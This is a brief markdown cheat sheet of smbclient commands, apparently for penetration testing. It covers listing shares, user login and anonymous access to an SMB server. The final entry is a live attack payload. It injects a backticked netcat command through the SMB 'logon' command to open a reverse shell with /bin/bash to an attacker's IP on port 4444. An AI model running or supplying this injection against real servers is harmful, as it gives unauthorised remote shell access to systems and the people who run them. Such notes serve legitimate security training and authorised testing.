# SMBClient
## Examples
### List services on a server
```
smbclient -L $IP
```
###  Login as a user in SMB
```
smbclient -L $IP -U "WorkgroupMasterName"
```
### Anonymous login
```
smbclient //$IP/share
```
### reverse shell with smb if 'logon' command exists
```
smb: \> logon “/=`nc 'myIP' 4444 -e /bin/bash`"
```